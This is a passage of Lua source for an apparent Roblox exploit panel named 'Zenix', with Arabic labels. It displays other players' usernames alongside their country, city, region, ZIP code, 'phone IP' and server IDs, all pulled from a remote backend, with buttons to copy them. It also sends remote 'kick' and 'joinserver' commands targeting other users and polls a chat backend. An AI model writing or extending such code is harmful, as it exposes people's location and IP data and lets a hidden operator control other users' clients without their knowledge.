                            row.Size = UDim2.new(1, -4, 0, 28)
                            row.BackgroundTransparency = 1
                            local l = Instance.new("TextLabel", row)
                            l.Size = UDim2.new(0.55, 0, 1, 0)
                            l.Position = UDim2.new(0, 4, 0, 0)
                            l.BackgroundTransparency = 1
                            l.Text = value
                            l.TextColor3 = Color3.new(1, 1, 1)
                            l.Font = Enum.Font.Code
                            l.TextSize = 12
                            l.TextXAlignment = Enum.TextXAlignment.Right
                            l.TextTruncate = Enum.TextTruncate.AtEnd
                            local lb = Instance.new("TextLabel", row)
                            lb.Size = UDim2.new(0.3, 0, 1, 0)
                            lb.Position = UDim2.new(0.6, 0, 0, 0)
                            lb.BackgroundTransparency = 1
                            lb.Text = label .. ":"
                            lb.TextColor3 = Color3.fromRGB(200, 200, 200)
                            lb.Font = Enum.Font.Code
                            lb.TextSize = 12
                            lb.TextXAlignment = Enum.TextXAlignment.Left
                            local cp = Instance.new("TextButton", row)
                            cp.Size = UDim2.new(0, 40, 0, 22)
                            cp.Position = UDim2.new(1, -42, 0, 3)
                            cp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                            cp.Text = "نسخ"
                            cp.Font = Enum.Font.GothamBold
                            cp.TextSize = 11
                            cp.TextColor3 = Color3.new(1, 1, 1)
                            Instance.new("UICorner", cp).CornerRadius = UDim.new(0, 4)
                            cp.MouseButton1Click:Connect(function()
                                if setclipboard then pcall(function() setclipboard(tostring(value)) end) end
                            end)
                        end

                        addRow("الاسم المستعار", tostring(pdata.displayName or ""))
                        addRow("الاسم الأساسي", tostring(pdata.username or ""))
                        addRow("الدولة", tostring(pdata.country or "Unknown"))
                        addRow("المدينة", tostring(pdata.city or "-"))
                        addRow("المنطقة", tostring(pdata.region or "-"))
                        addRow("الرمز البريدي", tostring(pdata.zip or "-"))
                        addRow("ip الهاتف", tostring(pdata.phoneIp or "N/A"))
                        addRow("عمر الحساب", tostring(pdata.accountAgeDays or 0) .. " يوم")
                        addRow("Place ID", tostring(pdata.placeId or 0))
                        addRow("Job ID", tostring(pdata.jobId or "-"))
                    end)

                    mkBtn("Join", 55, function()
                        local pid = tonumber(pdata.placeId) or game.PlaceId
                        local jid = tostring(pdata.jobId or "")
                        if jid ~= "" and jid ~= "nil" then
                            task.spawn(function()
                                pcall(function()
                                    TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
                                end)
                            end)
                        end
                    end)

                    mkBtn("JoinMe", 65, function()
                        if pdata.username == LocalPlayer.Name then return end
                        local myData = tostring(game.PlaceId) .. "|" .. tostring(game.JobId or "")
                        SendCommandAPI("joinserver", pdata.username, myData)
                    end)

                    mkBtn("X", 30, function()
                        if pdata.username == LocalPlayer.Name then return end
                        task.spawn(function()
                            HttpCall("POST", "commands.json", {
                                cmd = "kick", target = pdata.username, value = "",
                                sender = LocalPlayer.Name, timestamp = os.time(), status = "pending",
                            })
                        end)
                    end)
                end
            end

            task.spawn(function()
                while ConnScroll and ConnScroll.Parent do
                    pcall(RefreshPlayers)
                    task.wait(PLAYERS_REFRESH_INTERVAL)
                end
            end)
        end

        local chatNotifs = {}
        if CoreGui:FindFirstChild("ZenixChatNotifs") then
            CoreGui.ZenixChatNotifs:Destroy()
        end
        local chatSg = Instance.new("ScreenGui")
        chatSg.Name = "ZenixChatNotifs"
        chatSg.ResetOnSpawn = false
        chatSg.IgnoreGuiInset = true
        chatSg.DisplayOrder = 999999
        local cok = pcall(function() chatSg.Parent = CoreGui end)
        if not cok then chatSg.Parent = PlayerGui end
        local chatNotifHolder = Instance.new("Frame", chatSg)
        chatNotifHolder.Size = UDim2.new(0, 320, 1, 0)
        chatNotifHolder.Position = UDim2.new(1, -330, 0, 10)
        chatNotifHolder.BackgroundTransparency = 1
        local chLayout = Instance.new("UIListLayout", chatNotifHolder)
        chLayout.Padding = UDim.new(0, 6)
        chLayout.SortOrder = Enum.SortOrder.LayoutOrder

        local function RenumberChatNotifs()
            local ordered = {}
            for _, n in ipairs(chatNotifs) do
                if n.Frame and n.Frame.Parent then table.insert(ordered, n) end
            end
            chatNotifs = ordered
            for i, n in ipairs(chatNotifs) do
                if n.NumLabel then n.NumLabel.Text = "#" .. i end
            end
        end

        local function AddChatNotif(fromDisplay, message)
            local notif = Instance.new("Frame")
            notif.Size = UDim2.new(1, 0, 0, 90)
            notif.BackgroundColor3 = Color3.new(0, 0, 0)
            notif.BorderSizePixel = 0
            notif.Active = true
            notif.Draggable = true
            notif.Parent = chatNotifHolder
            Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 10)
            local st = Instance.new("UIStroke", notif)
            st.Color = Color3.new(1, 1, 1)
            st.Thickness = 1.5

            local numLbl = Instance.new("TextLabel", notif)
            numLbl.Size = UDim2.new(0, 30, 0, 18)
            numLbl.Position = UDim2.new(0, 6, 0, 4)
            numLbl.BackgroundTransparency = 1
            numLbl.Text = "#1"
            numLbl.TextColor3 = Color3.new(1, 1, 1)
            numLbl.Font = Enum.Font.GothamBold
            numLbl.TextSize = 12
            numLbl.TextXAlignment = Enum.TextXAlignment.Right

            local fromLbl = Instance.new("TextLabel", notif)
            fromLbl.Size = UDim2.new(1, -60, 0, 18)
            fromLbl.Position = UDim2.new(0, 40, 0, 4)
            fromLbl.BackgroundTransparency = 1
            fromLbl.Text = "من: " .. tostring(fromDisplay)
            fromLbl.TextColor3 = Color3.new(1, 1, 1)
            fromLbl.Font = Enum.Font.GothamBold
            fromLbl.TextSize = 12
            fromLbl.TextXAlignment = Enum.TextXAlignment.Right

            local xBtn = Instance.new("TextButton", notif)
            xBtn.Size = UDim2.new(0, 22, 0, 22)
            xBtn.Position = UDim2.new(1, -28, 0, 4)
            xBtn.BackgroundColor3 = Color3.new(0, 0, 0)
            xBtn.Text = "X"
            xBtn.TextColor3 = Color3.new(1, 1, 1)
            xBtn.Font = Enum.Font.GothamBold
            xBtn.TextSize = 12
            Instance.new("UICorner", xBtn).CornerRadius = UDim.new(0, 5)

            local msgLbl = Instance.new("TextLabel", notif)
            msgLbl.Size = UDim2.new(1, -16, 0, 58)
            msgLbl.Position = UDim2.new(0, 8, 0, 26)
            msgLbl.BackgroundTransparency = 1
            msgLbl.Text = tostring(message)
            msgLbl.TextColor3 = Color3.new(1, 1, 1)
            msgLbl.Font = Enum.Font.Gotham
            msgLbl.TextSize = 12
            msgLbl.TextWrapped = true
            msgLbl.TextYAlignment = Enum.TextYAlignment.Top
            msgLbl.TextXAlignment = Enum.TextXAlignment.Right

            local entry = { Frame = notif, NumLabel = numLbl }
            table.insert(chatNotifs, entry)
            RenumberChatNotifs()

            xBtn.MouseButton1Click:Connect(function()
                notif:Destroy()
                task.wait(0.05)
                local newList = {}
                for _, n in ipairs(chatNotifs) do
                    if n.Frame and n.Frame.Parent then table.insert(newList, n) end
                end
                chatNotifs = newList
                RenumberChatNotifs()
            end)
        end

        task.spawn(function()
            task.wait(3)
            while chatSg and chatSg.Parent do
                local ok, data = HttpCall("GET", "chatMessages.json")
                if ok and type(data) == "table" then
                    for key, msg in pairs(data) do
                        if type(msg) == "table" and not seenChatMsgs[key] then
                            local toDev = tostring(msg.toDeveloper or "")
                            if toDev == LocalPlayer.Name then
                                seenChatMsgs[key] = true
                                AddChatNotif(msg.fromDisplayName or msg.fromUsername, msg.message)
                            end
                        end
                    end
                end
                task.wait(3)
            end
        end)

        ToggleBtn.MouseButton1Click:Connect(function()
            MainFrame.Visible = not MainFrame.Visible
        end)
        CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
        MinBtn.MouseButton1Click:Connect(function()
            if MainFrame.Size.Y.Offset > 100 then
                MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, 40)
                MinBtn.Text = "+"
            else
                MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, 350)
                MinBtn.Text = "-"
            end
        end)

        ScreenGui.Destroying:Connect(function()
            for _, p in ipairs(Players:GetPlayers()) do
                if BangState[p.Name] then
                    if BangState[p.Name].Connection then BangState[p.Name].Connection:Disconnect() end
                    BangState[p.Name] = nil
                end
            end
        end)
    end)
end
